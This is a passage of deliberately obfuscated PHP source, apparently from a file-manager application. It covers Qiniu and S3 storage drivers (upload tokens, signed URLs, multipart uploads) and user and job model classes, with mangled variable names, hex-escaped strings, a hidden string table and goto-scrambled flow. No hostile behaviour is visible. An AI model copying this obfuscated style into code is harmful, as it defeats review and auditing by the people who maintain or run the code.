$‰…ŞìÏì = $´Õ¬‘†Û[12]; $£ÉğØ†› = 1000; $¯£ éÂÀ = $‰š¨á¤Ç = array(); while (!0) { check_abort(); list($ı‰“½ƒØ, $ÔÁ¤òîĞ) = $this->bucketManager->listFiles($this->bucket, $÷˜‚½ë©, $‰…ŞìÏì, $£ÉğØ†›, $¦æîŸ™Œ); if ($ÔÁ¤òîĞ) { break; } $‰…ŞìÏì = array_key_exists($´Õ¬‘†Û[1445], $ı‰“½ƒØ) ? $‰…ŞìÏì = $ı‰“½ƒØ[$´Õ¬‘†Û[1505]] : $´Õ¬‘†Û[12]; $ñ¯îëÎ² = isset($ı‰“½ƒØ[$´Õ¬‘†Û[1506]]) ? $ı‰“½ƒØ[$´Õ¬‘†Û[1506]] : array(); $î¶¾şùÇ = isset($ı‰“½ƒØ[$´Õ¬‘†Û[1507]]) ? $ı‰“½ƒØ[$´Õ¬‘†Û[1507]] : array(); foreach ($ñ¯îëÎ² as $ó©ù¥Œ­) { if ($ó©ù¥Œ­[$´Õ¬‘†Û[97]] == $÷˜‚½ë©) { continue; } $Á‚ÅØ = $ó©ù¥Œ­[$´Õ¬‘†Û[97]]; $¬£’Ç¸‡ = $ó©ù¥Œ­[$´Õ¬‘†Û[1503]]; $ó©ù¥Œ­[$´Õ¬‘†Û[79]] = $¬£’Ç¸‡; $šä¹ë£ã = $¬£’Ç¸‡ == 0 && substr($Á‚ÅØ, strlen($Á‚ÅØ) - 1, 1) == $´Õ¬‘†Û[8] ? !0 : !1; $this->cacheMethodInfoSet($Á‚ÅØ, $šä¹ë£ã, $ó©ù¥Œ­); if ($šä¹ë£ã) { $¯£ éÂÀ[] = $Á‚ÅØ; continue; } $‰š¨á¤Ç[] = $îˆİ«‹ğ ? $ó©ù¥Œ­ : $Á‚ÅØ; } foreach ($î¶¾şùÇ as $Á‚ÅØ) { if ($Á‚ÅØ == $÷˜‚½ë©) { continue; } $¯£ éÂÀ[] = $Á‚ÅØ; $this->cacheMethodInfoSet($Á‚ÅØ, !0); } if ($‰…ŞìÏì === $´Õ¬‘†Û[12]) { break; } } $this->cacheMethodInfoSet($÷“½øâ, !0); return array($´Õ¬‘†Û[85] => $¯£ éÂÀ, $´Õ¬‘†Û[86] => $‰š¨á¤Ç); } public function canRead($ÛÔå½—Ç) { return $this->exist($ÛÔå½—Ç) ? !0 : !1; } public function canWrite($Êè•¸¡ˆ) { return $this->exist($Êè•¸¡ˆ) ? !0 : !1; } public function getContent($º€¤Âô”) { return $this->fileSubstr($º€¤Âô”, 0, -1); } public function setContent($ªŒÀ¸², $ø¹§æü‘ = '') { $àêûóà = $this->tempFile($this->pathThis($ªŒÀ¸²)); file_put_contents($àêûóà, $ø¹§æü‘); if ($this->upload($ªŒÀ¸², $àêûóà)) { $this->tempFileRemve($àêûóà); return !0; } return !1; } public function refreshUrls($Ú¬©òÁ¤) { $ïÈ˜œç =& $_SERVER[º·Ï‹¥³]; $ß›¬ã› = array(); if (is_array($Ú¬©òÁ¤)) { foreach ($Ú¬©òÁ¤ as $«âıçÙ‰) { $ß›¬ã›[] = $this->link($«âıçÙ‰); } } else { $ß›¬ã›[] = $this->link($Ú¬©òÁ¤); } $¡ÍíõŞ = new Qiniu\Cdn\CdnManager($this->auth); list($ÔÑŸçÔ”, $æ÷â§÷) = $¡ÍíõŞ->refreshUrls($ß›¬ã›); if ($æ÷â§÷) { return !1; } return $ÔÑŸçÔ”[$ïÈ˜œç[1235]] == $ïÈ˜œç[811] ? !0 : !1; } public function fileSubstr($Ô‚ßĞí†, $¬¢­ıëò, $•–íù˜³) { $ê´€ÍµÔ =& $_SERVER[º·Ï‹¥³]; if (!($‘ê®’ö’ = $this->link($Ô‚ßĞí†))) { return !1; } $ŞÄåÍµ = !1; if ($•–íù˜³ > 0) { $áí“ ş = $¬¢­ıëò + $•–íù˜³ - 1; $ŞÄåÍµ = array($ê´€ÍµÔ[1508] . $¬¢­ıëò . $ê´€ÍµÔ[446] . $áí“ ş); } $‘‰È™Éø = url_request($‘ê®’ö’, $ê´€ÍµÔ[252], !1, $ŞÄåÍµ); return $‘‰È™Éø[$ê´€ÍµÔ[802]] ? $‘‰È™Éø[$ê´€ÍµÔ[1255]] : !1; } public function upload($­›û¸µ, $Ã’âö¤Ä, $¼º¹ƒ¾ = false, $€ƒğ—¡´ = REPEAT_REPLACE) { $§õÇëÊ = new Qiniu\Storage\UploadManager(); $¶Ÿò¢ø× = $this->auth->uploadToken($this->bucket, $­›û¸µ); $Ï€•…Û¶ = get_file_mime(get_path_ext($Ã’âö¤Ä)); list($ğç’ãÜ, $œœÙà§ş) = $§õÇëÊ->putFile($¶Ÿò¢ø×, $­›û¸µ, $Ã’âö¤Ä, null, $Ï€•…Û¶); return $œœÙà§ş ? !1 : $this->getPathOuter($­›û¸µ); } public function uploadFormData($²êâç¤Ã, $¹Š¹‹×ò = 3600) { return $this->uploadToken($²êâç¤Ã, $¹Š¹‹×ò); } public function multiUploadFormData($¶¾Ï¡¨Œ, $ÉÁ–¥›° = 3600) { return $this->uploadToken($¶¾Ï¡¨Œ, $ÉÁ–¥›°); } private function uploadToken($¯ï¼şÃó, $‹Î˜÷· = 3600) { $¨¶ç°ß =& $_SERVER[º·Ï‹¥³]; $ˆôò¶ºè = $‹Î˜÷·; $°ÃüÌâİ = array($¨¶ç°ß[1509] => $¨¶ç°ß[1510]); $òÒ€æÎş = $¯ï¼şÃó; $¿ãÓ‰äş = $this->auth->uploadToken($this->bucket, $òÒ€æÎş, $ˆôò¶ºè, $°ÃüÌâİ, !0); $×¸ È‚Ğ = empty($this->region) || $this->region == $¨¶ç°ß[1511] ? $¨¶ç°ß[12] : $¨¶ç°ß[446] . $this->region; $Õì‚ı» = http_type() . "\x3a\x2f\57\165\160\x6c\157\141\x64{$×¸ È‚Ğ}\56\x71\x69\x6e\x69\x75\x70\x2e\x63\157\155\x2f"; return array($¨¶ç°ß[1512] => $¿ãÓ‰äş, $¨¶ç°ß[1513] => $Õì‚ı»); } public function download($‘¶‰Õ‚¥, $çıšªç) { $ˆÍ©Èğ = IO::getPathInner(IO::mkfile($çıšªç)); if (!($ŒğÎ™éÍ = $this->link($‘¶‰Õ‚¥))) { return !1; } $áçîûÀ¼ = 0; $‡²í²¬ø = 1024 * 200; $ä“·†í´ = fopen($ˆÍ©Èğ, $_SERVER[º·Ï‹¥³][1514]); while (!0) { $êƒ¸ı”¿ = $this->fileSubstr($‘¶‰Õ‚¥, $áçîûÀ¼, $‡²í²¬ø); if ($êƒ¸ı”¿ === !1) { return !1; } fwrite($ä“·†í´, $êƒ¸ı”¿); $áçîûÀ¼ += $‡²í²¬ø; if (strlen($êƒ¸ı”¿) < $‡²í²¬ø) { break; } } fclose($ä“·†í´); return $çıšªç; } public function link($€íë±Ô¨, $ÛˆÒß˜ = '') { if (!$this->isFile($€íë±Ô¨)) { return !1; } $³¢ ê¨ = $this->getHost() . $_SERVER[º·Ï‹¥³][8] . $this->pathEncode($€íë±Ô¨) . $ÛˆÒß˜; return $this->auth->privateDownloadUrl($³¢ ê¨, 3600 * 12); } public function fileOut($é·ÅÈ…”, $å¡â€ó = false, $Í“ÖøÜ¼ = false, $ìÁß´Æœ = '') { $ÖıÜ—÷Ğ =& $_SERVER[º·Ï‹¥³]; if ($this->isFileOutServer()) { return $this->fileOutServer($é·ÅÈ…”, $å¡â€ó, $Í“ÖøÜ¼, $ìÁß´Æœ); } if (!$Í“ÖøÜ¼) { $Í“ÖøÜ¼ = $this->pathThis($é·ÅÈ…”); } $ôÚäÂœÒ = $å¡â€ó ? $ÖıÜ—÷Ğ[1515] . rawurlencode($Í“ÖøÜ¼) : $ÖıÜ—÷Ğ[12]; $¡µº¬¦ = $this->link($é·ÅÈ…”, $ôÚäÂœÒ); $this->fileOutLink($¡µº¬¦); } public function fileOutServer($ŸÃ–ı‘, $ÊÍ¢èÚÀ = false, $Ëü­Ü× = false, $ğßÎûÍ = '') { parent::fileOut($ŸÃ–ı‘, $ÊÍ¢èÚÀ, $Ëü­Ü×, $ğßÎûÍ); } public function fileOutImage($í¡€Û¬È, $“Š³„§ƒ = 250) { $Ï¸ÄĞ½ = $this->link($í¡€Û¬È, $_SERVER[º·Ï‹¥³][1516] . $“Š³„§ƒ); $this->fileOutLink($Ï¸ÄĞ½); } public function fileOutImageServer($Ùå×®ÖÈ, $©ï½Ùƒ = 250) { parent::fileOutImage($Ùå×®ÖÈ, $©ï½Ùƒ); } public function hashMd5($Šëâõ¸Æ) { $ŠıİÎÂ =& $_SERVER[º·Ï‹¥³]; $İù±˜éï = $this->objectMeta($Šëâõ¸Æ); return isset($İù±˜éï[$ŠıİÎÂ[236]]) ? $İù±˜éï[$ŠıİÎÂ[236]] : !1; $ó„àûÒ = $this->link($Šëâõ¸Æ, $ŠıİÎÂ[1517]); } public function size($ĞÄûŸ©ü) { $ÃûÉ’ä« = $this->objectMeta($ĞÄûŸ©ü); return $ÃûÉ’ä« ? $ÃûÉ’ä«[$_SERVER[º·Ï‹¥³][79]] : 0; } public function info($±âõ÷É¨) { if ($this->isFolder($±âõ÷É¨)) { return $this->folderInfo($±âõ÷É¨); } else { if ($this->isFile($±âõ÷É¨)) { return $this->fileInfo($±âõ÷É¨); } } return !1; } public function exist($ø¤¾ÏŠó) { return $this->isFile($ø¤¾ÏŠó) || $this->isFolder($ø¤¾ÏŠó); } public function isFile($ãØ©²ÔÚ) { return !$this->isFolder($ãØ©²ÔÚ) && $this->objectMeta($ãØ©²ÔÚ); } public function isFolder($ı–ŸØ”Î) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][169], $ı–ŸØ”Î); } protected function objectMeta($ŸşË‘«) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][171], $ŸşË‘«); } protected function _objectMeta($–ó‰ŒÎ²) { $Â€Ôš²Œ =& $_SERVER[º·Ï‹¥³]; list($û§Åß˜ß, $õ£‡§ˆÀ) = $this->bucketManager->stat($this->bucket, $–ó‰ŒÎ²); if ($û§Åß˜ß) { $û§Åß˜ß[$Â€Ôš²Œ[79]] = intval($û§Åß˜ß[$Â€Ôš²Œ[1503]]); } return $û§Åß˜ß; } protected function _isFolder($÷Ò²À¢Ü) { $ûò–Ìö =& $_SERVER[º·Ï‹¥³]; if ($÷Ò²À¢Ü == $ûò–Ìö[12] || $÷Ò²À¢Ü == $ûò–Ìö[8]) { return !0; } list($êÁÜñ“Ù, $ëÊğ†è) = $this->bucketManager->listFiles($this->bucket, trim($÷Ò²À¢Ü, $ûò–Ìö[8]) . $ûò–Ìö[8], $ûò–Ìö[12], 1, $ûò–Ìö[8]); return !empty($êÁÜñ“Ù[$ûò–Ìö[1506]]) || !empty($êÁÜñ“Ù[$ûò–Ìö[1507]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($í«Èİ¯ğ) { parent::__construct($í«Èİ¯ğ); } public function uploadFormData($“…³¨êì, $ËÖ¡úƒ = 3600) { $¿­Æ‰ÒŒ =& $_SERVER[º·Ï‹¥³]; $™ÍùÖ‘ş = $¿­Æ‰ÒŒ[220]; $á«àŸüÛ = $¿­Æ‰ÒŒ[261]; $Èô­ş„ = $¿­Æ‰ÒŒ[62]; $İ·¶ŠÀ´ = gmdate($¿­Æ‰ÒŒ[262]); $‰÷İÚÅ = gmdate($¿­Æ‰ÒŒ[263]); $ø–ä†˜ = $¿­Æ‰ÒŒ[264]; $Øß÷çŠ¶ = $ËÖ¡úƒ . $¿­Æ‰ÒŒ[12]; $°Üµôü¡ = $¿­Æ‰ÒŒ[265]; $–ÍÍ¼éş = array($this->accessKey, $‰÷İÚÅ, $this->region, $Èô­ş„, $ø–ä†˜); $­Ï¢’ÕØ = implode($¿­Æ‰ÒŒ[8], $–ÍÍ¼éş); $Ï°ÎíÏ´ = array($¿­Æ‰ÒŒ[266] => gmdate($¿­Æ‰ÒŒ[1380], strtotime($¿­Æ‰ÒŒ[268])), $¿­Æ‰ÒŒ[269] => array(array($¿­Æ‰ÒŒ[270] => $this->bucket), array($¿­Æ‰ÒŒ[271] => $™ÍùÖ‘ş), array($¿­Æ‰ÒŒ[272], $¿­Æ‰ÒŒ[273], $¿­Æ‰ÒŒ[12]), array($¿­Æ‰ÒŒ[272], $¿­Æ‰ÒŒ[274], $¿­Æ‰ÒŒ[12]), array($¿­Æ‰ÒŒ[272], $¿­Æ‰ÒŒ[275], $¿­Æ‰ÒŒ[12]), array($¿­Æ‰ÒŒ[276] => $°Üµôü¡), array($¿­Æ‰ÒŒ[277] => $­Ï¢’ÕØ), array($¿­Æ‰ÒŒ[278] => $á«àŸüÛ), array($¿­Æ‰ÒŒ[279] => $İ·¶ŠÀ´), array($¿­Æ‰ÒŒ[280] => $Øß÷çŠ¶))); $íù¦Èƒ¬ = base64_encode(json_encode($Ï°ÎíÏ´)); $éÆèëè = hash_hmac($¿­Æ‰ÒŒ[281], $‰÷İÚÅ, $¿­Æ‰ÒŒ[282] . $this->secret, !0); $ê³à¯ùÌ = hash_hmac($¿­Æ‰ÒŒ[281], $this->region, $éÆèëè, !0); $Şş¦ºµâ = hash_hmac($¿­Æ‰ÒŒ[281], $Èô­ş„, $ê³à¯ùÌ, !0); $ıöêÃ¹ = hash_hmac($¿­Æ‰ÒŒ[281], $ø–ä†˜, $Şş¦ºµâ, !0); $ôöúáÌÍ = hash_hmac($¿­Æ‰ÒŒ[281], $íù¦Èƒ¬, $ıöêÃ¹); $†á°Şšë = array($¿­Æ‰ÒŒ[237] => $¿­Æ‰ÒŒ[12], $¿­Æ‰ÒŒ[283] => $¿­Æ‰ÒŒ[12], $¿­Æ‰ÒŒ[271] => $™ÍùÖ‘ş, $¿­Æ‰ÒŒ[276] => $°Üµôü¡, $¿­Æ‰ÒŒ[284] => $íù¦Èƒ¬, $¿­Æ‰ÒŒ[285] => $­Ï¢’ÕØ, $¿­Æ‰ÒŒ[286] => $á«àŸüÛ, $¿­Æ‰ÒŒ[287] => $İ·¶ŠÀ´, $¿­Æ‰ÒŒ[288] => $Øß÷çŠ¶, $¿­Æ‰ÒŒ[289] => $ôöúáÌÍ, $¿­Æ‰ÒŒ[199] => $this->getHost()); return $†á°Şšë; } public function multiUploadFormData($”ç£Ú·€, $á ä¸©ë = 3600) { $‡×Íø¡Ê =& $_SERVER[º·Ï‹¥³]; $ª“’¾Ù• = gmdate($‡×Íø¡Ê[1518]); $úÎ·ô«„ = array(); $òÍßÔİ¡ = $this->client->getUploadId($this->bucket, $”ç£Ú·€, $úÎ·ô«„); if (!$òÍßÔİ¡) { return !1; } return array($‡×Íø¡Ê[245] => $òÍßÔİ¡, $‡×Íø¡Ê[199] => $this->getHost() . $‡×Íø¡Ê[8] . $this->pathEncode($”ç£Ú·€), $‡×Íø¡Ê[246] => $ª“’¾Ù•, $‡×Íø¡Ê[97] => $”ç£Ú·€); } public function multiUploadAuthData($¯ğïĞÏ, $£ª­Á…À = array()) { $’œƒãÚ =& $_SERVER[º·Ï‹¥³]; $ÆÖÇßÓù = isset($£ª­Á…À[$’œƒãÚ[178]]) ? $£ª­Á…À[$’œƒãÚ[178]] : $’œƒãÚ[12]; $£ıÂİ™¡ = $£ª­Á…À[$’œƒãÚ[97]]; unset($£ª­Á…À[$’œƒãÚ[97]]); if (isset($£ª­Á…À[$’œƒãÚ[247]])) { return $this->listUploadParts($£ıÂİ™¡, $£ª­Á…À); } $áïƒËÍ = array(); if (isset($£ª­Á…À[$’œƒãÚ[1519]])) { $áïƒËÍ[$’œƒãÚ[1520]] = $£ª­Á…À[$’œƒãÚ[1519]]; } $®ËÑº” = explode($’œƒãÚ[201], $this->getHost()); $Í¼ÀÄö÷ = array($’œƒãÚ[1521] => $®ËÑº”[1], $’œƒãÚ[1522] => $’œƒãÚ[12], $’œƒãÚ[237] => $’œƒãÚ[123], $’œƒãÚ[283] => $£ª­Á…À[$’œƒãÚ[79]]); $æì¢¶†Á = $’œƒãÚ[250]; $œ®˜¢ = $’œƒãÚ[8] . $this->pathEncode($£ıÂİ™¡) . $ÆÖÇßÓù; $Ö€ĞôÅÃ = $this->client->__getSignatureV4($áïƒËÍ, $Í¼ÀÄö÷, $æì¢¶†Á, $œ®˜¢); if (strpos($ÆÖÇßÓù, $’œƒãÚ[249]) === 0) { if (isset($áïƒËÍ[$’œƒãÚ[1520]])) { $ÜÏéàï = $áïƒËÍ[$’œƒãÚ[1520]]; } else { if (isset($Ö€ĞôÅÃ[$’œƒãÚ[1520]])) { $ÜÏéàï = $Ö€ĞôÅÃ[$’œƒãÚ[1520]]; } else { $ÜÏéàï = hash($’œƒãÚ[281], $’œƒãÚ[12]); } } return array($’œƒãÚ[256] => $Ö€ĞôÅÃ[$’œƒãÚ[256]], $’œƒãÚ[1520] => $ÜÏéàï, $’œƒãÚ[246] => $Ö€ĞôÅÃ[$’œƒãÚ[1523]]); } return $Ö€ĞôÅÃ[$’œƒãÚ[256]]; } public function listUploadParts($ŠŠ±Üœá, $—Üüß²ª = array()) { $ÒØ·Ç î =& $_SERVER[º·Ï‹¥³]; $»»ˆú¼ = str_replace($ÒØ·Ç î[257], $ÒØ·Ç î[12], $—Üüß²ª[$ÒØ·Ç î[178]]); $šÄñ¥‘ = $this->client->listParts($this->bucket, $ŠŠ±Üœá, $»»ˆú¼); if (!$šÄñ¥‘) { return !1; } $’ Î­ç” = $ÒØ·Ç î[1524]; foreach ($šÄñ¥‘ as $øŠ¾§Í) { $’ Î­ç” .= $ÒØ·Ç î[1525] . "\x3c\120\x61\162\x74\116\x75\x6d\142\145\162\x3e{$øŠ¾§Í[$ÒØ·Ç î[1453]]}\x3c\57\x50\141\162\x74\116\165\155\142\145\x72\x3e\xa" . "\74\x45\x54\141\147\x3e{$øŠ¾§Í[$ÒØ·Ç î[1454]]}\74\57\x45\124\141\147\76\xa" . $ÒØ·Ç î[1526]; } $’ Î­ç” .= $ÒØ·Ç î[1527]; $ÆÉÈ´ØÀ = array(); $Í‘·õ¯ª = explode($ÒØ·Ç î[201], $this->getHost()); $õÉ‰îÅª = array($ÒØ·Ç î[1521] => $Í‘·õ¯ª[1], $ÒØ·Ç î[237] => $ÒØ·Ç î[123], $ÒØ·Ç î[283] => strlen($’ Î­ç”)); $’ÖîÍØ = $ÒØ·Ç î[248]; $ÍÆî×ß’ = $ÒØ·Ç î[8] . $this->pathEncode($ŠŠ±Üœá) . $—Üüß²ª[$ÒØ·Ç î[178]]; $›÷è¶ÂÎ = $this->client->__getSignatureV4($ÆÉÈ´ØÀ, $õÉ‰îÅª, $’ÖîÍØ, $ÍÆî×ß’, $’ Î­ç”); return array($ÒØ·Ç î[256] => $›÷è¶ÂÎ[$ÒØ·Ç î[256]], $ÒØ·Ç î[246] => $›÷è¶ÂÎ[$ÒØ·Ç î[1523]], $ÒØ·Ç î[258] => $šÄñ¥‘, $ÒØ·Ç î[1520] => $›÷è¶ÂÎ[$ÒØ·Ç î[1520]]); } public function link($ƒò », $š»“Ğ¹â = array()) { return parent::link($ƒò », $š»“Ğ¹â); } public function fileOut($‘ÄŒÆ‹÷, $úÓ¥¨¥¿ = false, $ßà˜²ŠÛ = false, $¥¹³¼”Ì = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[º·Ï‹¥³][1528])) { return parent::fileOutServer($‘ÄŒÆ‹÷, $úÓ¥¨¥¿, $ßà˜²ŠÛ, $¥¹³¼”Ì); } parent::fileOut($‘ÄŒÆ‹÷, $úÓ¥¨¥¿, $ßà˜²ŠÛ, $¥¹³¼”Ì); } public function fileOutImage($ú—ëù¹Ë, $“™¼È¤„ = 250) { if (strstr($this->endpoint, $_SERVER[º·Ï‹¥³][1528])) { return parent::fileOutImageServer($ú—ëù¹Ë, $“™¼È¤„); } parent::fileOutImage($ú—ëù¹Ë, $“™¼È¤„); } public function fileOutLink($áİ¬¯µ“) { $Ë™êÓı¾ =& $_SERVER[º·Ï‹¥³]; if (substr($áİ¬¯µ“, 0, 7) == $Ë™êÓı¾[1377]) { $áİ¬¯µ“ = $Ë™êÓı¾[1378] . substr($áİ¬¯µ“, 7); } header($Ë™êÓı¾[165] . $áİ¬¯µ“); die; } } goto DƒÌ¹Ôˆ’­; FÄ¿šĞ´”È: define($_SERVER[º·Ï‹¥³][293], 1); define($_SERVER[º·Ï‹¥³][294], 0); define($_SERVER[º·Ï‹¥³][295], 2); goto c®¹å†Æë; EìŸƒ±Ïë: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\152\x6f\x62\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x64\145\x73\143", "\163\157\x72\x74"); const JOB_KEY = "\163\x65\154\146\112\157\142\114\x69\x73\164"; public function listData($¸İŠ¾‰ = false, $«¦ê­Ï = "\163\x6f\x72\164", $»—Şœ­› = false) { return parent::listData($¸İŠ¾‰, $«¦ê­Ï, $»—Şœ­›); } public function remove($ğ‘âÉõß) { return parent::remove($ğ‘âÉõß); } public function add($úÈ˜İ) { $­®ÉèŠ =& $_SERVER[º·Ï‹¥³]; if ($this->findByName($úÈ˜İ[$­®ÉèŠ[32]])) { return !1; } $úÈ˜İ[$­®ÉèŠ[1976]] = $this->getSort(); return parent::insert($úÈ˜İ); } private function getSort() { $“Æ”¥¥© =& $_SERVER[º·Ï‹¥³]; $ŠÇìÆ° = parent::listData(); $à‘ï‘ñú = array_to_keyvalue($ŠÇìÆ°, $“Æ”¥¥©[12], $“Æ”¥¥©[1976]); return empty($à‘ï‘ñú) ? 0 : max($à‘ï‘ñú) + 1; } public function update($Ö‡ÆÎ²¨, $ÌƒªÔ’ï) { $¤¬Ü†× =& $_SERVER[º·Ï‹¥³]; $¾Ó»‡È = parent::listData($Ö‡ÆÎ²¨); $îı²´ƒÂ = $this->findByName($ÌƒªÔ’ï[$¤¬Ü†×[32]]); if (!$¾Ó»‡È || $îı²´ƒÂ && $îı²´ƒÂ[$¤¬Ü†×[459]] != $¾Ó»‡È[$¤¬Ü†×[459]]) { return !1; } return parent::update($Ö‡ÆÎ²¨, $ÌƒªÔ’ï); } public function setUserJob($‘¶˜˜İ, $Ó¤éÈ¿–) { $˜·óñú… =& $_SERVER[º·Ï‹¥³]; if (!is_array($Ó¤éÈ¿–)) { $Ó¤éÈ¿– = array($Ó¤éÈ¿–); } $µõäà­ = parent::listData(); $İéÃ±ä = array_to_keyvalue($µõäà­, $˜·óñú…[32]); $’¶îĞÌ­ = $˜·óñú…[438]; foreach ($Ó¤éÈ¿– as $‚¬Ò™¨) { if ($İéÃ±ä[$‚¬Ò™¨]) { $’¶îĞÌ­ .= $İéÃ±ä[$‚¬Ò™¨][$˜·óñú…[459]] . $˜·óñú…[50]; } else { $‰ãƒ™¥ = $this->add($‚¬Ò™¨); $’¶îĞÌ­ .= $‰ãƒ™¥ . $˜·óñú…[50]; } } $’¶îĞÌ­ = rtrim($’¶îĞÌ­, $˜·óñú…[50]); Model($˜·óñú…[583])->metaSet($‘¶˜˜İ, self::JOB_KEY, $’¶îĞÌ­); } public function getUserJob($ÅÏú—¾Å) { $—Š•Æ”ù = Model($_SERVER[º·Ï‹¥³][583])->metaGet($ÅÏú—¾Å); return $this->getUserJobInfo($—Š•Æ”ù[self::JOB_KEY]); } public function getUserJobInfo($ØÆ™Âı) { $áÑæ„¾ =& $_SERVER[º·Ï‹¥³]; $ÌŒÌÆ„÷ = explode($áÑæ„¾[50], $ØÆ™Âı); $÷ÁĞâÛ® = parent::listData(); $÷ÁĞâÛ® = array_remove_key($÷ÁĞâÛ®, $áÑæ„¾[222]); $Š×Äõ‹µ = array(); foreach ($ÌŒÌÆ„÷ as $ñš–ùß¼) { if (isset($÷ÁĞâÛ®[$ñš–ùß¼])) { $Š×Äõ‹µ[] = $÷ÁĞâÛ®[$ñš–ùß¼]; } } return $Š×Äõ‹µ; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\155\145" => "\x75\163\x65\162\137\x6d\145\x74\x61", "\x6d\145\164\x61\106\x69\145\x6c\144" => "\x75\x73\x65\162\x49\x44"); protected $simpleField = "\x75\163\x65\162\111\x44\54\156\151\143\x6b\116\141\x6d\x65\54\x6e\141\x6d\145\x2c\x61\166\x61\164\x61\x72\x2c\x73\145\170\54\163\x74\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($³ĞšßÂã) { $¹±ˆı˜ø =& $_SERVER[º·Ï‹¥³]; $õÍî¬³² = $¹±ˆı˜ø[2434]; return array($¹±ˆı˜ø[2035] => array($³ĞšßÂã[0], $õÍî¬³²), $¹±ˆı˜ø[2037] => array($³ĞšßÂã[0], $õÍî¬³²), $¹±ˆı˜ø[2435] => array($³ĞšßÂã[0], $õÍî¬³²)); } protected function getInfo($‘ñ‰ğÉ©, $ÈéÖæË¤ = false) { $’ÛÌ²ã¯ = $this->getInfoSimple($‘ñ‰ğÉ©); if (!is_array($’ÛÌ²ã¯)) { return array(); } if ($ÈéÖæË¤) { return $this->_getInfoApply($’ÛÌ²ã¯); } return $this->cacheFunctionGet($_SERVER[º·Ï‹¥³][2039], $‘ñ‰ğÉ©); } protected function getInfoFull($¬Ÿ‘×ÕÏ, $“½ãó¿… = false) { $ÁÌÉû‘… = $this->getInfoSimple($¬Ÿ‘×ÕÏ); if (!is_array($ÁÌÉû‘…)) { return array(); } if ($“½ãó¿…) { return $this->_getInfoApply($ÁÌÉû‘…, !0); } return $this->cacheFunctionGet($_SERVER[º·Ï‹¥³][2436], $¬Ÿ‘×ÕÏ); } private function _getInfoApply($£ˆ€×ºø, $ôŸ€úÆ = false) { $†éëŠ“Û =& $_SERVER[º·Ï‹¥³]; if (!$£ˆ€×ºø) { return $£ˆ€×ºø; } $›¾Ú©â¦ = md5($†éëŠ“Û[2437] . $£ˆ€×ºø[$†éëŠ“Û[938]] . $†éëŠ“Û[2438] . $£ˆ€×ºø[$†éëŠ“Û[32]]); $£ˆ€×ºø = $this->_listDataApplyItem($£ˆ€×ºø); $ø¼Ü¯ïè = Model($†éëŠ“Û[1388])->metaGet($£ˆ€×ºø[$†éëŠ“Û[90]][$†éëŠ“Û[184]]); $£ˆ€×ºø[$†éëŠ“Û[2439]] = $›¾Ú©â¦; $£ˆ€×ºø[$†éëŠ“Û[90]][$†éëŠ“Û[2233]] = isset($ø¼Ü¯ïè[$†éëŠ“Û[2234]]) ? $ø¼Ü¯ïè[$†éëŠ“Û[2234]] : null; if ($ôŸ€úÆ) { $£ˆ€×ºø[$†éëŠ“Û[523]] = $this->metaGet($£ˆ€×ºø[$†éëŠ“Û[1754]]); } return $£ˆ€×ºø; } protected function getInfoSimple($à£ğ¿¥ˆ, $Û’ç°¸£ = false) { $Ôˆ´¯ =& $_SERVER[º·Ï‹¥³]; if (!$à£ğ¿¥ˆ) { return array(); } if ($Û’ç°¸£) { $†òæõé = $this->where(array($Ôˆ´¯[1754] => intval($à£ğ¿¥ˆ)))->find(); if (!is_array($†òæõé)) { return array(); } $†òæõé[$Ôˆ´¯[2440]] = Action($Ôˆ´¯[2441])->parseUrl($†òæõé[$Ôˆ´¯[2440]]); return $†òæõé; } return $this->cacheFunctionGet($Ôˆ´¯[2040], $à£ğ¿¥ˆ); } protected function getInfoSimpleOuter($Ù‡¿‹ì) { $”ŒÕ¨»… =& $_SERVER[º·Ï‹¥³]; if (!$Ù‡¿‹ì || $Ù‡¿‹ì == 0) { return array($”ŒÕ¨»…[1754] => $”ŒÕ¨»…[219], $”ŒÕ¨»…[32] => $”ŒÕ¨»…[166] . LNG($”ŒÕ¨»…[2442]) . $”ŒÕ¨»…[168], $”ŒÕ¨»…[2440] => STATIC_PATH . $”ŒÕ¨»…[2443]); } $¬§ğó‘½ = $this->cacheFunctionGet($”ŒÕ¨»…[2040], $Ù‡¿‹ì); $Ì¢È¿æß = array_field_key($¬§ğó‘½, explode($”ŒÕ¨»…[50], $this->simpleField)); if (!$Ì¢È¿æß) { return array($”ŒÕ¨»…[1754] => $”ŒÕ¨»…[1241], $”ŒÕ¨»…[32] => $”ŒÕ¨»…[166] . LNG($”ŒÕ¨»…[2444]) . $”ŒÕ¨»…[168], $”ŒÕ¨»…[2440] => STATIC_PATH . $”ŒÕ¨»…[2445]); } $Ì¢È¿æß[$”ŒÕ¨»…[2440]] = Action($”ŒÕ¨»…[2441])->parseUrl($Ì¢È¿æß[$”ŒÕ¨»…[2440]]); return $Ì¢È¿æß; } protected function groupUser($áø–×¡ò) { } public static function errorLang($ü¦Ş‘è) { $É‹İ‘˜ =& $_SERVER[º·Ï‹¥³]; $°Ó±˜Âİ = array(self::ERROR_USER_NOT_EXISTS => $É‹İ‘˜[2446], self::ERROR_USER_PASSWORD_ERROR => $É‹İ‘˜[2447], self::ERROR_USER_EXIST_NAME => $É‹İ‘˜[2448], self::ERROR_USER_EXIST_PHONE => $É‹İ‘˜[2449], self::ERROR_USER_EXIST_EMAIL => $É‹İ‘˜[2450], self::ERROR_USER_LOGIN_LOCK => $É‹İ‘˜[2451], self::ERROR_IP_NOT_ALLOW => $É‹İ‘˜[2452], self::ERROR_USER_EXIST_NICKNAME => $É‹İ‘˜[2453]); return LNG($°Ó±˜Âİ[$ü¦Ş‘è]); } public function getInfoByMeta($éË‡½ÆÒ, $˜å‹éÓ) { $“±ìœôá =& $_SERVER[º·Ï‹¥³]; $Â¨ñµªö = 